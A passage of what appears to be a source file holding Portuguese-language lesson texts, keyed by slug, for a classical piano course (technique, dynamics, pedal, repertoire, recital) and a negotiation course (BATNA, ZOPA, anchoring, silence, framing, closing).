Pulso estacionário = passagem ruim. Pulso deve levemente girar para acompanhar o movimento.`,

  "piano-classico/tecnicas/passagem-de-polegar": `Passagem de polegar é a técnica que permite tocar mais de 5 notas em sequência com uma mão. Parece simples; quebrar esse hábito de travar o pulso é o que leva meses.

## Mecânica

Enquanto dedos 3 ou 4 tocam, o polegar já viaja silenciosamente por baixo para a próxima nota. Quando ele toca, o dedo anterior se levanta simultaneamente — não depois.

## Exercício isolado

Toque Mi-Fá-Sol (dedos 3-4-polegar). Foque em ouvir os três sons igualmente fortes. O polegar é naturalmente pesado; compense tocando-o mais leve, não mais forte.`,

  "piano-classico/tecnicas/legato-staccato": `Legato e staccato são os dois extremos de articulação. Nem sempre marcados na partitura — muitas vezes implícitos no estilo (Bach = legato, Mozart = staccato leve). Dominar cada um em separado precede misturar.

## Legato

Conexão máxima entre notas. A tecla anterior só sobe quando a nova já desceu. Pedal sustain ajuda mas não substitui o legato de dedos.

## Staccato

Nota curta, separada. Pulse de pulso (staccato curto) ou movimento do dedo (staccato mais longo). Na mesma peça, você vai alternar — então treine a troca limpa.`,

  "piano-classico/tecnicas/exercicios-hanon": `Hanon é controverso — "exercícios mecânicos destroem musicalidade". A verdade é mais matizada: 15 minutos diários de Hanon criam força e independência de dedos sem prejudicar, desde que você não o use como substituto de repertório.

## Como praticar

Primeiro exercício, mãos juntas, 60 bpm. Quando fluente, suba para 80, depois 100. Nunca sacrifique precisão por velocidade. Com metrônomo sempre.

## Advertência

Hanon por 30+ minutos vira bagunça. 10–15 min é o máximo útil. Depois disso, vai para repertório ou teoria — não para mais Hanon.`,

  "piano-classico/dinamica/piano-forte": `Dinâmica é o que transforma notas em música. Piano (p), forte (f), fortissimo (ff), pianissimo (pp), crescendo e diminuendo — cada um é uma decisão interpretativa que tem peso igual às notas em si.

## Os marcos

ppp, pp, p, mp, mf, f, ff, fff. Não são absolutos: um pp no Chopin é diferente de um pp no Rachmaninoff. Contexto define intensidade real.

## Controle físico

Dinâmica em piano acústico vem do peso do braço. Forte = braço relaxado caindo na tecla. Piano = dedos segurando o peso, apenas ponta do dedo transferindo energia. Sem isso, p soa frágil e f soa duro.`,

  "piano-classico/dinamica/pedal-sustain": `O pedal de sustain é malcompreendido. Não é para "borrar tudo" nem para esconder imprecisão — é um instrumento independente com técnica própria. Mal usado, destrói peças inteiras.

## Pedal de ligação

Troca DEPOIS da nota nova tocar, nunca junto. Sequência: nota nova soa → pedal sobe → pedal desce. Se fizer junto, a harmonia anterior contamina a nova.

## Exercício

\`\`\`
Dó maior acorde (quatro tempos)
Fá maior acorde (quatro tempos)
Sol maior acorde (quatro tempos)

Pedalize cada mudança com pedal de ligação.
Ouça se cada acorde é limpo ou se tem resquício do anterior.
\`\`\`

## Regra geral

Menos pedal do que você acha que precisa. Principalmente em Bach (quase nenhum) e Mozart (apenas pontos de apoio).`,

  "piano-classico/dinamica/fraseado": `Frase musical é o equivalente de frase na linguagem falada: tem começo, desenvolvimento, clímax e resolução. Uma peça bem tocada é uma peça bem frasada — independente de velocidade ou virtuosismo.

## Identificar frases

Leia a melodia e cante. Onde você respira naturalmente? Onde a tensão sobe? Onde cai? Essa leitura é frase. A partitura raramente marca tudo — pauta é esqueleto, não corpo.

## Execução

Dentro da frase: crescendo sutil até o pico, decrescendo até o fim. Entre frases: micro-respiração, pequena separação que evita que tudo vire uma linha contínua.`,

  "piano-classico/dinamica/rubato": `Rubato é esticar e comprimir o tempo dentro de uma frase. Bem feito, emociona. Mal feito, parece que você está atrasado. Como quase tudo em música, começa com domínio do tempo estrito.

## A regra de Chopin

Rubato bom "rouba do tempo e devolve": se acelera na primeira metade da frase, desacelera na segunda. O tempo médio permanece constante. Só pareceu flexível.

## Como estudar

Toque a peça rigorosamente no tempo por uma semana. Depois introduza rubato em 2-3 pontos específicos, calculados. Nunca improvise rubato em performance até ter feito isso controlado muitas vezes.`,

  "piano-classico/dinamica/respiracao-musical": `Respiração musical é a pausa consciente entre frases — curta, mas presente. Você precisa dela como o ouvinte precisa. Peças sem respiração parecem apressadas mesmo em tempo correto.

## Onde respirar

No final de cada frase. Nos pontos de clímax emocional. Antes de mudanças de seção. Durante fermatas óbvias e fermatas ocultas.

## Quanto tempo

Imperceptível — 1/8 de tempo, talvez menos. O suficiente para o ouvido processar. Mais que isso e parece hesitação.`,

  "piano-classico/dinamica/interpretacao-bach": `Bach é singularmente difícil porque a partitura não marca quase nada: sem dinâmica, sem fraseado explícito, sem pedal. Tudo isso é escolha sua, informada por convenção da época e análise da estrutura.

## Princípios

Polifonia: múltiplas vozes simultaneamente, cada uma com sua própria dinâmica relativa. Articulação: mistura de legato e staccato, raramente os extremos. Pedal: usar minimamente, apenas como suporte em acordes plenos.

## Abordagem

Estude cada voz separadamente. Entenda a estrutura harmônica. Decida dinâmica baseada em tensão harmônica (crescendo em modulações distantes, diminuendo em retornos tônicos).`,

  "piano-classico/repertorio/minueto-bach": `O Minueto em Sol do caderninho de Anna Magdalena é a primeira peça "de verdade" para muitos pianistas. Parece simples; ensina tudo.

## Desafios

Coordenação entre mãos em polifonia simples. Fraseado em períodos de 4 compassos. Ornamentação (trilos simples). Articulação diferenciada entre as vozes.

## Objetivo

Execução limpa, em tempo (cerca de 70 bpm para semínima), sem pedal. Entrega: gravação de áudio + partitura anotada com dedilhado e articulação escolhidos.`,

  "piano-classico/repertorio/fur-elise": `Fur Elise é marcado ficilmente por ser a primeira peça "popular" que aluno pede. É mais difícil do que parece, especialmente nas seções B e C.

## Estrutura

Rondó ABACA. Seção A é acessível. Seções B e C (na parte central, em Fá maior e em Ré maior) demandam escalas rápidas, arpejos e dinâmica controlada.

## Objetivo

A peça completa em tempo moderado (~120 bpm para colcheia), com contraste claro entre seções. Gravação + análise harmônica da seção B em anexo.`,

  "piano-classico/repertorio/prelude-chopin": `Prelúdio Op. 28 nº 7 em Lá maior ("O Jardim") é curto (16 compassos) e enganosamente simples — uma das peças mais expressivas do repertório inicial romântico.

## Desafios

Sonoridade (cada acorde precisa cantar). Pedal de ligação entre harmonias. Rubato sutil. Dinâmica que sustenta mesmo em pp.

## Objetivo

Peça inteira executada com dinâmica diferenciada entre as quatro frases e uso preciso do pedal. Gravação em silêncio absoluto, microfone próximo.`,

  "piano-classico/repertorio/gymnopedie-satie": `Gymnopédie nº 1 é meditativa, lenta e expositiva. Satie escreveu três delas como uma unidade; a primeira é a mais conhecida. O desafio é manter o público atento sem acelerar.

## Desafios

Tempo lento (66 bpm para semínima). Pedal contínuo sem borrar harmonias. Dinâmica uniforme (mf com microvariações). Manter legato absoluto na melodia.

## Objetivo

Execução em tempo correto, do início ao fim, sem um tropeço. Gravação + relato escrito do que você sente durante a execução (prática de atenção).`,

  "piano-classico/repertorio/nocturnes-primeiros": `Noturnos de Chopin são objetivos de longo prazo. Op. 9 nº 2 em Mi bemol e Op. 55 nº 1 em Fá menor são portas de entrada — ainda assim exigem o que você acumulou até aqui.

## Op. 9 nº 2

Bel canto ao piano: melodia cantável sustentada por acompanhamento regular na mão esquerda. Rubato sem perder a pulsação. Ornamentação elaborada na recapitulação.

## Objetivo

Dominar uma das duas peças completamente. Gravação em performance integral. Análise harmônica da modulação mais interessante.`,

  "piano-classico/repertorio/recital-final": `O recital final consolida 6 meses de trabalho. Não é prova — é celebração do progresso, feita publicamente (mesmo que a "plateia" seja uma única pessoa).

## Programa

3 peças contrastantes: uma barroca (Bach Minueto ou Inventio), uma romântica (Prelude Chopin), uma moderna/contemporânea (Satie ou peça brasileira de escolha).

## Preparação

30 dias antes: toque o programa completo duas vezes por semana, registrado. Corrija micropontos com paciência. 7 dias antes: toque o programa completo apenas na hora da apresentação mental. Não sobrecarregue.

## Dia

Chegue cedo, sente no banco, regule altura, respire. Toque como se estivesse na sala de estudo. Se algo quebrar, continue — ninguém além de você nota 90% dos deslizes.`,

  // ─── Negociação ───────────────────────────────────────────────────────────

  "negociacao/fundamentos/o-que-e-batna": `BATNA — Best Alternative to a Negotiated Agreement — é sua melhor alternativa caso a negociação fracasse. É a fundação de qualquer posição negocial. Sem BATNA claro, você aceita qualquer coisa por medo de perder o acordo.

## Como identificar o seu

Liste todas as opções fora desta negociação. Avalie cada uma em termos reais (custo, tempo, energia). A melhor delas é seu BATNA. Saber isso antes de entrar na sala define até onde você pode ceder.

## Por que importa

Quando a outra parte propõe algo pior que seu BATNA, você sai. Quando propõe melhor, você considera. Simples em teoria, desconfortável em prática — porque "sair" exige coragem informada.

## Exemplo

Você está negociando salário para uma nova vaga. BATNA: manter emprego atual + proposta concorrente (se houver) + tempo de busca por outra oferta. Se a vaga atual paga R$ 12k e a concorrente oferece R$ 15k, seu BATNA mínimo é R$ 15k.`,

  "negociacao/fundamentos/zopa": `ZOPA — Zone Of Possible Agreement — é a faixa onde ambas as partes aceitariam o acordo. Existe quando o mínimo de uma parte é menor que o máximo da outra. Sem ZOPA, qualquer negociação é perda de tempo.

## Identificar ZOPA

Você precisa estimar: seu ponto de reserva (mínimo aceitável, informado pelo BATNA), ponto de reserva do outro (estimativa via pesquisa), ZOPA = intersecção.

## Sem ZOPA

Se seu mínimo é R$ 15k e o teto do outro é R$ 12k, não há ZOPA. Insistir significa forçar uma das partes a aceitar abaixo de seu mínimo — decisão ruim que gera ressentimento.

## Com ZOPA

Quando ZOPA existe, a negociação é sobre dividir valor dentro dela. Estratégia, ancoragem e escuta ativa determinam onde o acordo cai dentro desse range.`,

  "negociacao/fundamentos/escuta-ativa": `Escuta ativa não é esperar para falar. É absorver, processar e refletir o que o outro disse antes de responder. É contra-intuitivo porque parece mais lento — mas entrega resultado muito superior.

## Os quatro elementos

1. Atenção completa (sem checar celular, sem formular resposta durante a fala). 2. Parafrasear o essencial ("entendi que você precisa de X até a data Y"). 3. Perguntar para esclarecer, não para desafiar. 4. Silêncio antes de responder (3 segundos).

## Exercício

Numa conversa de 30 minutos, faça uma meta explícita: parafrasear três vezes o que a outra pessoa disse, antes de expressar sua posição. Anote no papel os três momentos. No início é estranho. Depois do quinto exercício, vira hábito.

## Efeito

A outra parte se sente ouvida. Isso abre espaço para concessões que não apareceriam em conversa-combate. A maioria dos acordos bons começa com escuta, não com argumento.`,

  "negociacao/taticas/ancoragem": `Ancoragem é a observação de que o primeiro número mencionado pesa desproporcionalmente na negociação final. É um viés cognitivo bem documentado — e você escolhe se vai usá-lo ou ser usado por ele.

## Como funciona

O cérebro humano ancora em números concretos. Se a primeira proposta é R$ 100k, as contra-propostas orbitam esse valor (R$ 80k, R$ 120k). Se fosse R$ 50k, as contra-propostas seriam R$ 40k, R$ 60k.

## Quando ancorar primeiro

Quando você tem boa informação sobre a ZOPA. Lance um número dentro da ZOPA mas favorável a você. Justifique com dados, não com emoção.

## Quando deixar o outro ancorar

Quando você tem pouca informação. Deixa o outro falar primeiro — a âncora dele te dá informação sobre o range dele.`,

  "negociacao/taticas/silencio": `Silêncio desconforta. A maioria das pessoas, após uma proposta, não suporta silêncio maior que 5 segundos — e oferece concessões apenas para preencher o vácuo. Usar isso é quase trapaça. Não usar, é presente para o outro lado.

## Lab prático

Em sua próxima negociação (mesmo uma conversa simples), após fazer uma pergunta importante, pare de falar. Conte até dez internamente. Observe o que o outro faz.

## O que esperar

Ele vai: 1) repetir a pergunta em outras palavras, 2) adicionar informação não solicitada, 3) fazer uma concessão antes de você responder. Todas são vitórias para você.

## Advertência

Não abuse. Silêncio é ferramenta, não estratégia única. Se tudo é silêncio, vira hostilidade percebida.`,

  "negociacao/taticas/quadros-de-referencia": `O quadro de referência define como uma proposta é percebida. Mesmo número, narrativa diferente, reação diferente. Mudar o quadro é a ferramenta mais sutil — e mais poderosa — do repertório.

## Exemplo

"R$ 500 de aluguel a mais" soa caro. "R$ 16 por dia" soa razoável. Mesmo valor, quadros diferentes. Fisicamente idênticos, psicologicamente distantes.

## Aplicação

Antes de apresentar sua proposta, pergunte: qual é a métrica natural do outro lado? Tempo? Dinheiro? Benefício? Enquadre em termos do que importa para ele, não do que é matematicamente preciso.`,

  "negociacao/taticas/lidando-com-pressao": `Pressão em negociação é inevitável — deadlines, ameaças veladas, escalation artificial. Saber identificar e responder sem reatividade separa negociador experiente de amador.

## Tipos de pressão

1. Deadline artificial ("preciso de resposta até amanhã"). 2. Escalação ("meu chefe precisa aprovar e ele é rigoroso"). 3. Ameaça de afastamento ("temos outras opções"). 4. Empatia forçada ("eu gostaria mas não posso").

## Resposta padrão

Pausa (3 segundos). Nomear o que está acontecendo, silenciosamente para si mesmo. Responder à substância, não à pressão. "Entendo que há deadline. Posso dar minha resposta definitiva em 48h" — não cede ao prazo, responde ao tópico real.

## Exercício

Grave mentalmente as próximas três vezes que sentir pressão em qualquer conversa. Registre: qual tática foi usada, como você reagiu, como poderia ter reagido. Revise depois.`,

  "negociacao/fechamento/fechar-sem-afobar": `Fechamento é a fase onde acordos se consolidam — ou se desfazem. Apressar o fechamento é a causa #1 de acordos que ambas as partes lamentam depois.

## Sinais de prontidão

Ambas as partes pararam de argumentar pontos novos. A conversa começou a girar sobre detalhes operacionais. Há concordância verbal, mas ainda não escrita. Se você percebe esses sinais, está pronto para propor fechamento.

## Proposta

"Baseado no que discutimos, proponho: [termos claros, em 3 bullets]. Esses termos funcionam para você?" Pausa. Silêncio. Deixe o outro responder.

## Se houver objeção

Não argumente. Pergunte: "o que especificamente precisa mudar para você ficar confortável?" Ajuste mínimo, re-proponha. Até duas iterações. Mais que isso: não há acordo hoje, revisita outra hora.`,

  "negociacao/fechamento/acordo-vs-ganhar": `Negociação não é guerra. "Ganhar" uma negociação — no sentido de arrancar o máximo e deixar o outro lado machucado — é quase sempre perda de longo prazo. Acordo sustentável vence vitória isolada.

## Por quê

Relacionamentos em negócios são iterativos. Se você "venceu" o fornecedor hoje, ele cobra mais caro amanhã, ou para de responder rápido, ou entrega pior. Se você "venceu" o colega, ele lembra. Memória organizacional é real.

## O acordo bom

Distribui valor proporcional à contribuição e ao risco de cada parte. Deixa ambos levemente inconfortáveis mas operacionalmente satisfeitos. Ninguém sente que foi explorado.

## Teste

Se a outra parte tivesse que negociar novamente com você daqui a 6 meses, sabendo o resultado desta, ela aceitaria? Se a resposta é "com entusiasmo", você esqueceu de defender seu lado. Se é "de jeito nenhum", você explorou demais. O meio-termo é o alvo.`,

  "negociacao/fechamento/simulacao-final": `Este projeto é uma simulação integrada. Você negocia um caso real (fictício mas realista) aplicando BATNA, ZOPA, escuta ativa, ancoragem, silêncio, reframing, gestão de pressão e fechamento consciente.

## Cenário

Você é consultor freelancer. Cliente quer projeto de 3 meses. Orçamento do cliente: até R$ 45k. Sua tarifa usual: R$ 18k/mês. Seu BATNA: contrato concorrente a R$ 14k/mês (menos interessante tecnicamente).

## Entrega

Roteiro escrito (diálogo de 2 páginas) mostrando: como você descobriu a ZOPA, onde ancorou, onde aplicou silêncio, como fechou. Inclua uma autoavaliação: o que funcionou, o que você mudaria.

## Critério

Não é atingir o maior valor possível. É demonstrar uso consciente de cada ferramenta aprendida. Um acordo em R$ 16k com uso elegante das técnicas vale mais que R$ 20k via pressão bruta.`,
};
